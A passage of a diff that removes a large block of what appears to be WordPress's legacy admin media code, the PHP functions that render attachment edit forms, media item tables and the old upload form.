-	foreach ( $alignments as $name => $label ) {
-		$name = esc_attr($name);
-		$out[] = "<input type='radio' name='attachments[{$post->ID}][align]' id='image-align-{$name}-{$post->ID}' value='$name'".
-			( $checked == $name ? " checked='checked'" : "" ) .
-			" /><label for='image-align-{$name}-{$post->ID}' class='align image-align-{$name}-label'>$label</label>";
-	}
-	return join("\n", $out);
-}
-
-/**
- * Retrieve HTML for the size radio buttons with the specified one checked.
- *
- * @since 2.7.0
- *
- * @param WP_Post $post
- * @param bool|string $check
- * @return array
- */
-function image_size_input_fields( $post, $check = '' ) {
-	/**
-	 * Filters the names and labels of the default image sizes.
-	 *
-	 * @since 3.3.0
-	 *
-	 * @param array $size_names Array of image sizes and their names. Default values
-	 *                          include 'Thumbnail', 'Medium', 'Large', 'Full Size'.
-	 */
-	$size_names = apply_filters( 'image_size_names_choose', array(
-		'thumbnail' => __( 'Thumbnail' ),
-		'medium'    => __( 'Medium' ),
-		'large'     => __( 'Large' ),
-		'full'      => __( 'Full Size' )
-	) );
-
-	if ( empty( $check ) ) {
-		$check = get_user_setting('imgsize', 'medium');
-	}
-	$out = array();
-
-	foreach ( $size_names as $size => $label ) {
-		$downsize = image_downsize( $post->ID, $size );
-		$checked = '';
-
-		// Is this size selectable?
-		$enabled = ( $downsize[3] || 'full' == $size );
-		$css_id = "image-size-{$size}-{$post->ID}";
-
-		// If this size is the default but that's not available, don't select it.
-		if ( $size == $check ) {
-			if ( $enabled ) {
-				$checked = " checked='checked'";
-			} else {
-				$check = '';
-			}
-		} elseif ( ! $check && $enabled && 'thumbnail' != $size ) {
-			/*
-			 * If $check is not enabled, default to the first available size
-			 * that's bigger than a thumbnail.
-			 */
-			$check = $size;
-			$checked = " checked='checked'";
-		}
-
-		$html = "<div class='image-size-item'><input type='radio' " . disabled( $enabled, false, false ) . "name='attachments[$post->ID][image-size]' id='{$css_id}' value='{$size}'$checked />";
-
-		$html .= "<label for='{$css_id}'>$label</label>";
-
-		// Only show the dimensions if that choice is available.
-		if ( $enabled ) {
-			$html .= " <label for='{$css_id}' class='help'>" . sprintf( "(%d&nbsp;&times;&nbsp;%d)", $downsize[1], $downsize[2] ). "</label>";
-		}
-		$html .= '</div>';
-
-		$out[] = $html;
-	}
-
-	return array(
-		'label' => __( 'Size' ),
-		'input' => 'html',
-		'html'  => join( "\n", $out ),
-	);
-}
-
-/**
- * Retrieve HTML for the Link URL buttons with the default link type as specified.
- *
- * @since 2.7.0
- *
- * @param WP_Post $post
- * @param string $url_type
- * @return string
- */
-function image_link_input_fields($post, $url_type = '') {
-
-	$file = wp_get_attachment_url($post->ID);
-	$link = get_attachment_link($post->ID);
-
-	if ( empty($url_type) )
-		$url_type = get_user_setting('urlbutton', 'post');
-
-	$url = '';
-	if ( $url_type == 'file' )
-		$url = $file;
-	elseif ( $url_type == 'post' )
-		$url = $link;
-
-	return "
-	<input type='text' class='text urlfield' name='attachments[$post->ID][url]' value='" . esc_attr($url) . "' /><br />
-	<button type='button' class='button urlnone' data-link-url=''>" . __('None') . "</button>
-	<button type='button' class='button urlfile' data-link-url='" . esc_attr($file) . "'>" . __('File URL') . "</button>
-	<button type='button' class='button urlpost' data-link-url='" . esc_attr($link) . "'>" . __('Attachment Post URL') . "</button>
-";
-}
-
-/**
- * Output a textarea element for inputting an attachment caption.
- *
- * @since 3.4.0
- *
- * @param WP_Post $edit_post Attachment WP_Post object.
- * @return string HTML markup for the textarea element.
- */
-function wp_caption_input_textarea($edit_post) {
-	// Post data is already escaped.
-	$name = "attachments[{$edit_post->ID}][post_excerpt]";
-
-	return '<textarea name="' . $name . '" id="' . $name . '">' . $edit_post->post_excerpt . '</textarea>';
-}
-
-/**
- * Retrieves the image attachment fields to edit form fields.
- *
- * @since 2.5.0
- *
- * @param array $form_fields
- * @param object $post
- * @return array
- */
-function image_attachment_fields_to_edit($form_fields, $post) {
-	return $form_fields;
-}
-
-/**
- * Retrieves the single non-image attachment fields to edit form fields.
- *
- * @since 2.5.0
- *
- * @param array   $form_fields An array of attachment form fields.
- * @param WP_Post $post        The WP_Post attachment object.
- * @return array Filtered attachment form fields.
- */
-function media_single_attachment_fields_to_edit( $form_fields, $post ) {
-	unset($form_fields['url'], $form_fields['align'], $form_fields['image-size']);
-	return $form_fields;
-}
-
-/**
- * Retrieves the post non-image attachment fields to edito form fields.
- *
- * @since 2.8.0
- *
- * @param array   $form_fields An array of attachment form fields.
- * @param WP_Post $post        The WP_Post attachment object.
- * @return array Filtered attachment form fields.
- */
-function media_post_single_attachment_fields_to_edit( $form_fields, $post ) {
-	unset($form_fields['image_url']);
-	return $form_fields;
-}
-
-/**
- * Filters input from media_upload_form_handler() and assigns a default
- * post_title from the file name if none supplied.
- *
- * Illustrates the use of the {@see 'attachment_fields_to_save'} filter
- * which can be used to add default values to any field before saving to DB.
- *
- * @since 2.5.0
- *
- * @param array $post       The WP_Post attachment object converted to an array.
- * @param array $attachment An array of attachment metadata.
- * @return array Filtered attachment post object.
- */
-function image_attachment_fields_to_save( $post, $attachment ) {
-	if ( substr( $post['post_mime_type'], 0, 5 ) == 'image' ) {
-		if ( strlen( trim( $post['post_title'] ) ) == 0 ) {
-			$attachment_url = ( isset( $post['attachment_url'] ) ) ? $post['attachment_url'] : $post['guid'];
-			$post['post_title'] = preg_replace( '/\.\w+$/', '', wp_basename( $attachment_url ) );
-			$post['errors']['post_title']['errors'][] = __( 'Empty Title filled from filename.' );
-		}
-	}
-
-	return $post;
-}
-
-/**
- * Retrieves the media element HTML to send to the editor.
- *
- * @since 2.5.0
- *
- * @param string $html
- * @param integer $attachment_id
- * @param array $attachment
- * @return string
- */
-function image_media_send_to_editor($html, $attachment_id, $attachment) {
-	$post = get_post($attachment_id);
-	if ( substr($post->post_mime_type, 0, 5) == 'image' ) {
-		$url = $attachment['url'];
-		$align = !empty($attachment['align']) ? $attachment['align'] : 'none';
-		$size = !empty($attachment['image-size']) ? $attachment['image-size'] : 'medium';
-		$alt = !empty($attachment['image_alt']) ? $attachment['image_alt'] : '';
-		$rel = ( strpos( $url, 'attachment_id') || $url === get_attachment_link( $attachment_id ) );
-
-		return get_image_send_to_editor($attachment_id, $attachment['post_excerpt'], $attachment['post_title'], $align, $url, $rel, $size, $alt);
-	}
-
-	return $html;
-}
-
-/**
- * Retrieves the attachment fields to edit form fields.
- *
- * @since 2.5.0
- *
- * @param WP_Post $post
- * @param array $errors
- * @return array
- */
-function get_attachment_fields_to_edit($post, $errors = null) {
-	if ( is_int($post) )
-		$post = get_post($post);
-	if ( is_array($post) )
-		$post = new WP_Post( (object) $post );
-
-	$image_url = wp_get_attachment_url($post->ID);
-
-	$edit_post = sanitize_post($post, 'edit');
-
-	$form_fields = array(
-		'post_title'   => array(
-			'label'      => __('Title'),
-			'value'      => $edit_post->post_title
-		),
-		'image_alt'   => array(),
-		'post_excerpt' => array(
-			'label'      => __('Caption'),
-			'input'      => 'html',
-			'html'       => wp_caption_input_textarea($edit_post)
-		),
-		'post_content' => array(
-			'label'      => __('Description'),
-			'value'      => $edit_post->post_content,
-			'input'      => 'textarea'
-		),
-		'url'          => array(
-			'label'      => __('Link URL'),
-			'input'      => 'html',
-			'html'       => image_link_input_fields($post, get_option('image_default_link_type')),
-			'helps'      => __('Enter a link URL or click above for presets.')
-		),
-		'menu_order'   => array(
-			'label'      => __('Order'),
-			'value'      => $edit_post->menu_order
-		),
-		'image_url'	=> array(
-			'label'      => __('File URL'),
-			'input'      => 'html',
-			'html'       => "<input type='text' class='text urlfield' readonly='readonly' name='attachments[$post->ID][url]' value='" . esc_attr($image_url) . "' /><br />",
-			'value'      => wp_get_attachment_url($post->ID),
-			'helps'      => __('Location of the uploaded file.')
-		)
-	);
-
-	foreach ( get_attachment_taxonomies($post) as $taxonomy ) {
-		$t = (array) get_taxonomy($taxonomy);
-		if ( ! $t['public'] || ! $t['show_ui'] )
-			continue;
-		if ( empty($t['label']) )
-			$t['label'] = $taxonomy;
-		if ( empty($t['args']) )
-			$t['args'] = array();
-
-		$terms = get_object_term_cache($post->ID, $taxonomy);
-		if ( false === $terms )
-			$terms = wp_get_object_terms($post->ID, $taxonomy, $t['args']);
-
-		$values = array();
-
-		foreach ( $terms as $term )
-			$values[] = $term->slug;
-		$t['value'] = join(', ', $values);
-
-		$form_fields[$taxonomy] = $t;
-	}
-
-	// Merge default fields with their errors, so any key passed with the error (e.g. 'error', 'helps', 'value') will replace the default
-	// The recursive merge is easily traversed with array casting: foreach ( (array) $things as $thing )
-	$form_fields = array_merge_recursive($form_fields, (array) $errors);
-
-	// This was formerly in image_attachment_fields_to_edit().
-	if ( substr($post->post_mime_type, 0, 5) == 'image' ) {
-		$alt = get_post_meta($post->ID, '_wp_attachment_image_alt', true);
-		if ( empty($alt) )
-			$alt = '';
-
-		$form_fields['post_title']['required'] = true;
-
-		$form_fields['image_alt'] = array(
-			'value' => $alt,
-			'label' => __('Alternative Text'),
-			'helps' => __('Alt text for the image, e.g. &#8220;The Mona Lisa&#8221;')
-		);
-
-		$form_fields['align'] = array(
-			'label' => __('Alignment'),
-			'input' => 'html',
-			'html'  => image_align_input_fields($post, get_option('image_default_align')),
-		);
-
-		$form_fields['image-size'] = image_size_input_fields( $post, get_option('image_default_size', 'medium') );
-
-	} else {
-		unset( $form_fields['image_alt'] );
-	}
-
-	/**
-	 * Filters the attachment fields to edit.
-	 *
-	 * @since 2.5.0
-	 *
-	 * @param array   $form_fields An array of attachment form fields.
-	 * @param WP_Post $post        The WP_Post attachment object.
-	 */
-	$form_fields = apply_filters( 'attachment_fields_to_edit', $form_fields, $post );
-
-	return $form_fields;
-}
-
-/**
- * Retrieve HTML for media items of post gallery.
- *
- * The HTML markup retrieved will be created for the progress of SWF Upload
- * component. Will also create link for showing and hiding the form to modify
- * the image attachment.
- *
- * @since 2.5.0
- *
- * @global WP_Query $wp_the_query
- *
- * @param int $post_id Optional. Post ID.
- * @param array $errors Errors for attachment, if any.
- * @return string
- */
-function get_media_items( $post_id, $errors ) {
-	$attachments = array();
-	if ( $post_id ) {
-		$post = get_post($post_id);
-		if ( $post && $post->post_type == 'attachment' )
-			$attachments = array($post->ID => $post);
-		else
-			$attachments = get_children( array( 'post_parent' => $post_id, 'post_type' => 'attachment', 'orderby' => 'menu_order ASC, ID', 'order' => 'DESC') );
-	} else {
-		if ( is_array($GLOBALS['wp_the_query']->posts) )
-			foreach ( $GLOBALS['wp_the_query']->posts as $attachment )
-				$attachments[$attachment->ID] = $attachment;
-	}
-
-	$output = '';
-	foreach ( (array) $attachments as $id => $attachment ) {
-		if ( $attachment->post_status == 'trash' )
-			continue;
-		if ( $item = get_media_item( $id, array( 'errors' => isset($errors[$id]) ? $errors[$id] : null) ) )
-			$output .= "\n<div id='media-item-$id' class='media-item child-of-$attachment->post_parent preloaded'><div class='progress hidden'><div class='bar'></div></div><div id='media-upload-error-$id' class='hidden'></div><div class='filename hidden'></div>$item\n</div>";
-	}
-
-	return $output;
-}
-
-/**
- * Retrieve HTML form for modifying the image attachment.
- *
- * @since 2.5.0
- *
- * @global string $redir_tab
- *
- * @param int $attachment_id Attachment ID for modification.
- * @param string|array $args Optional. Override defaults.
- * @return string HTML form for attachment.
- */
-function get_media_item( $attachment_id, $args = null ) {
-	global $redir_tab;
-
-	if ( ( $attachment_id = intval( $attachment_id ) ) && $thumb_url = wp_get_attachment_image_src( $attachment_id, 'thumbnail', true ) )
-		$thumb_url = $thumb_url[0];
-	else
-		$thumb_url = false;
-
-	$post = get_post( $attachment_id );
-	$current_post_id = !empty( $_GET['post_id'] ) ? (int) $_GET['post_id'] : 0;
-
-	$default_args = array(
-		'errors' => null,
-		'send' => $current_post_id ? post_type_supports( get_post_type( $current_post_id ), 'editor' ) : true,
-		'delete' => true,
-		'toggle' => true,
-		'show_title' => true
-	);
-	$args = wp_parse_args( $args, $default_args );
-
-	/**
-	 * Filters the arguments used to retrieve an image for the edit image form.
-	 *
-	 * @since 3.1.0
-	 *
-	 * @see get_media_item
-	 *
-	 * @param array $args An array of arguments.
-	 */
-	$r = apply_filters( 'get_media_item_args', $args );
-
-	$toggle_on  = __( 'Show' );
-	$toggle_off = __( 'Hide' );
-
-	$file = get_attached_file( $post->ID );
-	$filename = esc_html( wp_basename( $file ) );
-	$title = esc_attr( $post->post_title );
-
-	$post_mime_types = get_post_mime_types();
-	$keys = array_keys( wp_match_mime_types( array_keys( $post_mime_types ), $post->post_mime_type ) );
-	$type = reset( $keys );
-	$type_html = "<input type='hidden' id='type-of-$attachment_id' value='" . esc_attr( $type ) . "' />";
-
-	$form_fields = get_attachment_fields_to_edit( $post, $r['errors'] );
-
-	if ( $r['toggle'] ) {
-		$class = empty( $r['errors'] ) ? 'startclosed' : 'startopen';
-		$toggle_links = "
-	<a class='toggle describe-toggle-on' href='#'>$toggle_on</a>
-	<a class='toggle describe-toggle-off' href='#'>$toggle_off</a>";
-	} else {
-		$class = '';
-		$toggle_links = '';
-	}
-
-	$display_title = ( !empty( $title ) ) ? $title : $filename; // $title shouldn't ever be empty, but just in case
-	$display_title = $r['show_title'] ? "<div class='filename new'><span class='title'>" . wp_html_excerpt( $display_title, 60, '&hellip;' ) . "</span></div>" : '';
-
-	$gallery = ( ( isset( $_REQUEST['tab'] ) && 'gallery' == $_REQUEST['tab'] ) || ( isset( $redir_tab ) && 'gallery' == $redir_tab ) );
-	$order = '';
-
-	foreach ( $form_fields as $key => $val ) {
-		if ( 'menu_order' == $key ) {
-			if ( $gallery )
-				$order = "<div class='menu_order'> <input class='menu_order_input' type='text' id='attachments[$attachment_id][menu_order]' name='attachments[$attachment_id][menu_order]' value='" . esc_attr( $val['value'] ). "' /></div>";
-			else
-				$order = "<input type='hidden' name='attachments[$attachment_id][menu_order]' value='" . esc_attr( $val['value'] ) . "' />";
-
-			unset( $form_fields['menu_order'] );
-			break;
-		}
-	}
-
-	$media_dims = '';
-	$meta = wp_get_attachment_metadata( $post->ID );
-	if ( isset( $meta['width'], $meta['height'] ) )
-		$media_dims .= "<span id='media-dims-$post->ID'>{$meta['width']}&nbsp;&times;&nbsp;{$meta['height']}</span> ";
-
-	/**
-	 * Filters the media metadata.
-	 *
-	 * @since 2.5.0
-	 *
-	 * @param string  $media_dims The HTML markup containing the media dimensions.
-	 * @param WP_Post $post       The WP_Post attachment object.
-	 */
-	$media_dims = apply_filters( 'media_meta', $media_dims, $post );
-
-	$image_edit_button = '';
-	if ( wp_attachment_is_image( $post->ID ) && wp_image_editor_supports( array( 'mime_type' => $post->post_mime_type ) ) ) {
-		$nonce = wp_create_nonce( "image_editor-$post->ID" );
-		$image_edit_button = "<input type='button' id='imgedit-open-btn-$post->ID' onclick='imageEdit.open( $post->ID, \"$nonce\" )' class='button' value='" . esc_attr__( 'Edit Image' ) . "' /> <span class='spinner'></span>";
-	}
-
-	$attachment_url = get_permalink( $attachment_id );
-
-	$item = "
-	$type_html
-	$toggle_links
-	$order
-	$display_title
-	<table class='slidetoggle describe $class'>
-		<thead class='media-item-info' id='media-head-$post->ID'>
-		<tr>
-			<td class='A1B1' id='thumbnail-head-$post->ID'>
-			<p><a href='$attachment_url' target='_blank'><img class='thumbnail' src='$thumb_url' alt='' /></a></p>
-			<p>$image_edit_button</p>
-			</td>
-			<td>
-			<p><strong>" . __('File name:') . "</strong> $filename</p>
-			<p><strong>" . __('File type:') . "</strong> $post->post_mime_type</p>
-			<p><strong>" . __('Upload date:') . "</strong> " . mysql2date( __( 'F j, Y' ), $post->post_date ). '</p>';
-			if ( !empty( $media_dims ) )
-				$item .= "<p><strong>" . __('Dimensions:') . "</strong> $media_dims</p>\n";
-
-			$item .= "</td></tr>\n";
-
-	$item .= "
-		</thead>
-		<tbody>
-		<tr><td colspan='2' class='imgedit-response' id='imgedit-response-$post->ID'></td></tr>\n
-		<tr><td style='display:none' colspan='2' class='image-editor' id='image-editor-$post->ID'></td></tr>\n
-		<tr><td colspan='2'><p class='media-types media-types-required-info'>" . sprintf( __( 'Required fields are marked %s' ), '<span class="required">*</span>' ) . "</p></td></tr>\n";
-
-	$defaults = array(
-		'input'      => 'text',
-		'required'   => false,
-		'value'      => '',
-		'extra_rows' => array(),
-	);
-
-	if ( $r['send'] ) {
-		$r['send'] = get_submit_button( __( 'Insert into Post' ), '', "send[$attachment_id]", false );
-	}
-
-	$delete = empty( $r['delete'] ) ? '' : $r['delete'];
-	if ( $delete && current_user_can( 'delete_post', $attachment_id ) ) {
-		if ( !EMPTY_TRASH_DAYS ) {
-			$delete = "<a href='" . wp_nonce_url( "post.php?action=delete&amp;post=$attachment_id", 'delete-post_' . $attachment_id ) . "' id='del[$attachment_id]' class='delete-permanently'>" . __( 'Delete Permanently' ) . '</a>';
-		} elseif ( !MEDIA_TRASH ) {
-			$delete = "<a href='#' class='del-link' onclick=\"document.getElementById('del_attachment_$attachment_id').style.display='block';return false;\">" . __( 'Delete' ) . "</a>
-			 <div id='del_attachment_$attachment_id' class='del-attachment' style='display:none;'>" .
-			 /* translators: %s: file name */
-			'<p>' . sprintf( __( 'You are about to delete %s.' ), '<strong>' . $filename . '</strong>' ) . "</p>
-			 <a href='" . wp_nonce_url( "post.php?action=delete&amp;post=$attachment_id", 'delete-post_' . $attachment_id ) . "' id='del[$attachment_id]' class='button'>" . __( 'Continue' ) . "</a>
-			 <a href='#' class='button' onclick=\"this.parentNode.style.display='none';return false;\">" . __( 'Cancel' ) . "</a>
-			 </div>";
-		} else {
-			$delete = "<a href='" . wp_nonce_url( "post.php?action=trash&amp;post=$attachment_id", 'trash-post_' . $attachment_id ) . "' id='del[$attachment_id]' class='delete'>" . __( 'Move to Trash' ) . "</a>
-			<a href='" . wp_nonce_url( "post.php?action=untrash&amp;post=$attachment_id", 'untrash-post_' . $attachment_id ) . "' id='undo[$attachment_id]' class='undo hidden'>" . __( 'Undo' ) . "</a>";
-		}
-	} else {
-		$delete = '';
-	}
-
-	$thumbnail = '';
-	$calling_post_id = 0;
-	if ( isset( $_GET['post_id'] ) ) {
-		$calling_post_id = absint( $_GET['post_id'] );
-	} elseif ( isset( $_POST ) && count( $_POST ) ) {// Like for async-upload where $_GET['post_id'] isn't set
-		$calling_post_id = $post->post_parent;
-	}
-	if ( 'image' == $type && $calling_post_id && current_theme_supports( 'post-thumbnails', get_post_type( $calling_post_id ) )
-		&& post_type_supports( get_post_type( $calling_post_id ), 'thumbnail' ) && get_post_thumbnail_id( $calling_post_id ) != $attachment_id ) {
-
-		$calling_post = get_post( $calling_post_id );
-		$calling_post_type_object = get_post_type_object( $calling_post->post_type );
-
-		$ajax_nonce = wp_create_nonce( "set_post_thumbnail-$calling_post_id" );
-		$thumbnail = "<a class='wp-post-thumbnail' id='wp-post-thumbnail-" . $attachment_id . "' href='#' onclick='WPSetAsThumbnail(\"$attachment_id\", \"$ajax_nonce\");return false;'>" . esc_html( $calling_post_type_object->labels->use_featured_image ) . "</a>";
-	}
-
-	if ( ( $r['send'] || $thumbnail || $delete ) && !isset( $form_fields['buttons'] ) ) {
-		$form_fields['buttons'] = array( 'tr' => "\t\t<tr class='submit'><td></td><td class='savesend'>" . $r['send'] . " $thumbnail $delete</td></tr>\n" );
-	}
-	$hidden_fields = array();
-
-	foreach ( $form_fields as $id => $field ) {
-		if ( $id[0] == '_' )
-			continue;
-
-		if ( !empty( $field['tr'] ) ) {
-			$item .= $field['tr'];
-			continue;
-		}
-
-		$field = array_merge( $defaults, $field );
-		$name = "attachments[$attachment_id][$id]";
-
-		if ( $field['input'] == 'hidden' ) {
-			$hidden_fields[$name] = $field['value'];
-			continue;
-		}
-
-		$required      = $field['required'] ? '<span class="required">*</span>' : '';
-		$required_attr = $field['required'] ? ' required' : '';
-		$aria_required = $field['required'] ? " aria-required='true'" : '';
-		$class  = $id;
-		$class .= $field['required'] ? ' form-required' : '';
-
-		$item .= "\t\t<tr class='$class'>\n\t\t\t<th scope='row' class='label'><label for='$name'><span class='alignleft'>{$field['label']}{$required}</span><br class='clear' /></label></th>\n\t\t\t<td class='field'>";
-		if ( !empty( $field[ $field['input'] ] ) )
-			$item .= $field[ $field['input'] ];
-		elseif ( $field['input'] == 'textarea' ) {
-			if ( 'post_content' == $id && user_can_richedit() ) {
-				// Sanitize_post() skips the post_content when user_can_richedit.
-				$field['value'] = htmlspecialchars( $field['value'], ENT_QUOTES );
-			}
-			// Post_excerpt is already escaped by sanitize_post() in get_attachment_fields_to_edit().
-			$item .= "<textarea id='$name' name='$name'{$required_attr}{$aria_required}>" . $field['value'] . '</textarea>';
-		} else {
-			$item .= "<input type='text' class='text' id='$name' name='$name' value='" . esc_attr( $field['value'] ) . "'{$required_attr}{$aria_required} />";
-		}
-		if ( !empty( $field['helps'] ) )
-			$item .= "<p class='help'>" . join( "</p>\n<p class='help'>", array_unique( (array) $field['helps'] ) ) . '</p>';
-		$item .= "</td>\n\t\t</tr>\n";
-
-		$extra_rows = array();
-
-		if ( !empty( $field['errors'] ) )
-			foreach ( array_unique( (array) $field['errors'] ) as $error )
-				$extra_rows['error'][] = $error;
-
-		if ( !empty( $field['extra_rows'] ) )
-			foreach ( $field['extra_rows'] as $class => $rows )
-				foreach ( (array) $rows as $html )
-					$extra_rows[$class][] = $html;
-
-		foreach ( $extra_rows as $class => $rows )
-			foreach ( $rows as $html )
-				$item .= "\t\t<tr><td></td><td class='$class'>$html</td></tr>\n";
-	}
-
-	if ( !empty( $form_fields['_final'] ) )
-		$item .= "\t\t<tr class='final'><td colspan='2'>{$form_fields['_final']}</td></tr>\n";
-	$item .= "\t</tbody>\n";
-	$item .= "\t</table>\n";
-
-	foreach ( $hidden_fields as $name => $value )
-		$item .= "\t<input type='hidden' name='$name' id='$name' value='" . esc_attr( $value ) . "' />\n";
-
-	if ( $post->post_parent < 1 && isset( $_REQUEST['post_id'] ) ) {
-		$parent = (int) $_REQUEST['post_id'];
-		$parent_name = "attachments[$attachment_id][post_parent]";
-		$item .= "\t<input type='hidden' name='$parent_name' id='$parent_name' value='$parent' />\n";
-	}
-
-	return $item;
-}
-
-/**
- * @since 3.5.0
- *
- * @param int   $attachment_id
- * @param array $args
- * @return array
- */
-function get_compat_media_markup( $attachment_id, $args = null ) {
-	$post = get_post( $attachment_id );
-
-	$default_args = array(
-		'errors' => null,
-		'in_modal' => false,
-	);
-
-	$user_can_edit = current_user_can( 'edit_post', $attachment_id );
-
-	$args = wp_parse_args( $args, $default_args );
-
-	/** This filter is documented in wp-admin/includes/media.php */
-	$args = apply_filters( 'get_media_item_args', $args );
-
-	$form_fields = array();
-
-	if ( $args['in_modal'] ) {
-		foreach ( get_attachment_taxonomies($post) as $taxonomy ) {
-			$t = (array) get_taxonomy($taxonomy);
-			if ( ! $t['public'] || ! $t['show_ui'] )
-				continue;
-			if ( empty($t['label']) )
-				$t['label'] = $taxonomy;
-			if ( empty($t['args']) )
-				$t['args'] = array();
-
-			$terms = get_object_term_cache($post->ID, $taxonomy);
-			if ( false === $terms )
-				$terms = wp_get_object_terms($post->ID, $taxonomy, $t['args']);
-
-			$values = array();
-
-			foreach ( $terms as $term )
-				$values[] = $term->slug;
-			$t['value'] = join(', ', $values);
-			$t['taxonomy'] = true;
-
-			$form_fields[$taxonomy] = $t;
-		}
-	}
-
-	// Merge default fields with their errors, so any key passed with the error (e.g. 'error', 'helps', 'value') will replace the default
-	// The recursive merge is easily traversed with array casting: foreach ( (array) $things as $thing )
-	$form_fields = array_merge_recursive($form_fields, (array) $args['errors'] );
-
-	/** This filter is documented in wp-admin/includes/media.php */
-	$form_fields = apply_filters( 'attachment_fields_to_edit', $form_fields, $post );
-
-	unset( $form_fields['image-size'], $form_fields['align'], $form_fields['image_alt'],
-		$form_fields['post_title'], $form_fields['post_excerpt'], $form_fields['post_content'],
-		$form_fields['url'], $form_fields['menu_order'], $form_fields['image_url'] );
-
-	/** This filter is documented in wp-admin/includes/media.php */
-	$media_meta = apply_filters( 'media_meta', '', $post );
-
-	$defaults = array(
-		'input'         => 'text',
-		'required'      => false,
-		'value'         => '',
-		'extra_rows'    => array(),
-		'show_in_edit'  => true,
-		'show_in_modal' => true,
-	);
-
-	$hidden_fields = array();
-
-	$item = '';
-	foreach ( $form_fields as $id => $field ) {
-		if ( $id[0] == '_' )
-			continue;
-
-		$name = "attachments[$attachment_id][$id]";
-		$id_attr = "attachments-$attachment_id-$id";
-
-		if ( !empty( $field['tr'] ) ) {
-			$item .= $field['tr'];
-			continue;
-		}
-
-		$field = array_merge( $defaults, $field );
-
-		if ( ( ! $field['show_in_edit'] && ! $args['in_modal'] ) || ( ! $field['show_in_modal'] && $args['in_modal'] ) )
-			continue;
-
-		if ( $field['input'] == 'hidden' ) {
-			$hidden_fields[$name] = $field['value'];
-			continue;
-		}
-
-		$readonly      = ! $user_can_edit && ! empty( $field['taxonomy'] ) ? " readonly='readonly' " : '';
-		$required      = $field['required'] ? '<span class="required">*</span>' : '';
-		$required_attr = $field['required'] ? ' required' : '';
-		$aria_required = $field['required'] ? " aria-required='true'" : '';
-		$class  = 'compat-field-' . $id;
-		$class .= $field['required'] ? ' form-required' : '';
-
-		$item .= "\t\t<tr class='$class'>";
-		$item .= "\t\t\t<th scope='row' class='label'><label for='$id_attr'><span class='alignleft'>{$field['label']}</span>$required<br class='clear' /></label>";
-		$item .= "</th>\n\t\t\t<td class='field'>";
-
-		if ( !empty( $field[ $field['input'] ] ) )
-			$item .= $field[ $field['input'] ];
-		elseif ( $field['input'] == 'textarea' ) {
-			if ( 'post_content' == $id && user_can_richedit() ) {
-				// sanitize_post() skips the post_content when user_can_richedit.
-				$field['value'] = htmlspecialchars( $field['value'], ENT_QUOTES );
-			}
-			$item .= "<textarea id='$id_attr' name='$name'{$required_attr}{$aria_required}>" . $field['value'] . '</textarea>';
-		} else {
-			$item .= "<input type='text' class='text' id='$id_attr' name='$name' value='" . esc_attr( $field['value'] ) . "' $readonly{$required_attr}{$aria_required} />";
-		}
-		if ( !empty( $field['helps'] ) )
-			$item .= "<p class='help'>" . join( "</p>\n<p class='help'>", array_unique( (array) $field['helps'] ) ) . '</p>';
-		$item .= "</td>\n\t\t</tr>\n";
-
-		$extra_rows = array();
-
-		if ( !empty( $field['errors'] ) )
-			foreach ( array_unique( (array) $field['errors'] ) as $error )
-				$extra_rows['error'][] = $error;
-
-		if ( !empty( $field['extra_rows'] ) )
-			foreach ( $field['extra_rows'] as $class => $rows )
-				foreach ( (array) $rows as $html )
-					$extra_rows[$class][] = $html;
-
-		foreach ( $extra_rows as $class => $rows )
-			foreach ( $rows as $html )
-				$item .= "\t\t<tr><td></td><td class='$class'>$html</td></tr>\n";
-	}
-
-	if ( !empty( $form_fields['_final'] ) )
-		$item .= "\t\t<tr class='final'><td colspan='2'>{$form_fields['_final']}</td></tr>\n";
-
-	if ( $item ) {
-		$item = '<p class="media-types media-types-required-info">' .
-			sprintf( __( 'Required fields are marked %s' ), '<span class="required">*</span>' ) . '</p>
-			<table class="compat-attachment-fields">' . $item . '</table>';
-	}
-
-	foreach ( $hidden_fields as $hidden_field => $value ) {
-		$item .= '<input type="hidden" name="' . esc_attr( $hidden_field ) . '" value="' . esc_attr( $value ) . '" />' . "\n";
-	}
-
-	if ( $item )
-		$item = '<input type="hidden" name="attachments[' . $attachment_id . '][menu_order]" value="' . esc_attr( $post->menu_order ) . '" />' . $item;
-
-	return array(
-		'item'   => $item,
-		'meta'   => $media_meta,
-	);
-}
-
-/**
- * Outputs the legacy media upload header.
- *
- * @since 2.5.0
- */
-function media_upload_header() {
-	$post_id = isset( $_REQUEST['post_id'] ) ? intval( $_REQUEST['post_id'] ) : 0;
-
-	echo '<script type="text/javascript">post_id = ' . $post_id . ';</script>';
-	if ( empty( $_GET['chromeless'] ) ) {
-		echo '<div id="media-upload-header">';
-		the_media_upload_tabs();
-		echo '</div>';
-	}
-}
-
-/**
- * Outputs the legacy media upload form.
- *
- * @since 2.5.0
- *
- * @global string $type
- * @global string $tab
- * @global bool   $is_IE
- * @global bool   $is_opera
- *
- * @param array $errors
- */
-function media_upload_form( $errors = null ) {
-	global $type, $tab, $is_IE, $is_opera;
-
-	if ( ! _device_can_upload() ) {
-		echo '<p>' . sprintf( __('The web browser on your device cannot be used to upload files. You may be able to use the <a href="%s">native app for your device</a> instead.'), 'https://apps.wordpress.org/' ) . '</p>';
-		return;
-	}
-
-	$upload_action_url = admin_url('async-upload.php');
-	$post_id = isset($_REQUEST['post_id']) ? intval($_REQUEST['post_id']) : 0;
-	$_type = isset($type) ? $type : '';
-	$_tab = isset($tab) ? $tab : '';
-
-	$max_upload_size = wp_max_upload_size();
-	if ( ! $max_upload_size ) {
-		$max_upload_size = 0;
-	}
-?>
-
-<div id="media-upload-notice"><?php
-
-	if (isset($errors['upload_notice']) )
-		echo $errors['upload_notice'];
-
-?></div>
-<div id="media-upload-error"><?php
-
-	if (isset($errors['upload_error']) && is_wp_error($errors['upload_error']))
-		echo $errors['upload_error']->get_error_message();
-
-?></div>
-<?php
-if ( is_multisite() && !is_upload_space_available() ) {
-	/**
-	 * Fires when an upload will exceed the defined upload space quota for a network site.
-	 *
-	 * @since 3.5.0
-	 */
-	do_action( 'upload_ui_over_quota' );
-	return;
-}
-
-/**
- * Fires just before the legacy (pre-3.5.0) upload interface is loaded.
- *
- * @since 2.6.0
- */
-do_action( 'pre-upload-ui' );
-
-$post_params = array(
-	"post_id" => $post_id,
-	"_wpnonce" => wp_create_nonce('media-form'),
-	"type" => $_type,
-	"tab" => $_tab,
-	"short" => "1",
-);
-
-/**
- * Filters the media upload post parameters.
- *
- * @since 3.1.0 As 'swfupload_post_params'
- * @since 3.3.0
- *
- * @param array $post_params An array of media upload parameters used by Plupload.
- */
-$post_params = apply_filters( 'upload_post_params', $post_params );
-
-/*
